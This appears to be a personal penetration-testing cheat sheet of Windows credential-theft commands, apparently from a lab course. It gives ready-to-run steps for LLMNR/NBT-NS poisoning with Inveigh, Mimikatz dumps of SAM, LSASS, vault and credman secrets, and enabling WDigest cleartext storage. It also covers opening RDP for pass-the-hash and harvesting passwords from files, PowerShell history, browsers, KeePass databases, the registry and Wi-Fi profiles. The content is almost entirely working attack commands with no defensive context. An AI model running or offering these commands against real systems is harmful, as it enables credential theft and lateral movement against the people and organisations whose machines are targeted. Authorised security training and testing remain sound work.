- [ ] LLMNR/NBT-NS Poisonning - Inveigh
- [ ] Hunting Creds Into Shares
- [ ] Mimikatz - Creds Extraction
- [ ] Creds Hunting

LLMNR/NBT-NS Poisonning - Inveigh!!!
```powershell
# ps1
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# csharp
.\Inveigh.exe
```
Hunting Creds Into Shares!!!
```powershell
# 1
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
# 2
.\Snaffler.exe -s
```
Mimikatz - Creds Extraction!!!
```powershell
# sam
mimikatz.exe "lsadump::sam" "exit"
mimikatz.exe "lsadump::lsa" "exit"
# lsass memory
mimikatz.exe "sekurlsa::ekeys" "exit"
# vault
mimikatz.exe "vault::cred /patch" "exit"
# logonpasswords
mimikatz.exe "sekurlsa::logonpasswords" "exit"
# credman
mimikatz.exe "sekurlsa::credman" "exit"

reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

gpupdate /force

shutdown /r /t 0
# RDP
reg.exe add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
```
Creds Hunting!!!
```powershell
# 1-Searching For Password
findstr /SI /M "password" *.xml *.ini *.txt *.config
findstr /SI /M "ldapadmin" *.xml *.ini *.txt *.rdp
findstr /spin "ldap" .
where /R C:\ *.kdbx
where /R C:\ *.xml
where /R C:\ *.kirbi
where /R C:\ *confidential.txt
where /R C:\ *unattended.xml
# 2-PowerShell History File
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
# 3-Sticky Notes Database Path
where /R C:\ *plum.sqlite
# 4-Cmdkey Saved Credentials
cmdkey /list
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
# 5-Chomium based browsers | FireFox
.\SharpChrome.exe logins /unprotect
where /R C:\ *logins.json
where /R C:\ *key4.db
# 6-Password Managers
where /R C:\ *.kdbx
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
# 7-Email
https://github.com/dafthack/MailSniper
Invoke-SelfSearch -Mailbox current-user@domain.com
# 8-SessionGopher
Import-Module .\SessionGopher.ps1
Invoke SessionGopher -Thorough
Invoke SessionGopher -Target WINLPE-SRV01
Invoke SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
# 9-Clear-Text Password Storage in the Registry
reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
reg.exe query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
# 10-Wifi Passwords
netsh wlan show profile
netsh wlan show profile <profile> key=clear
```

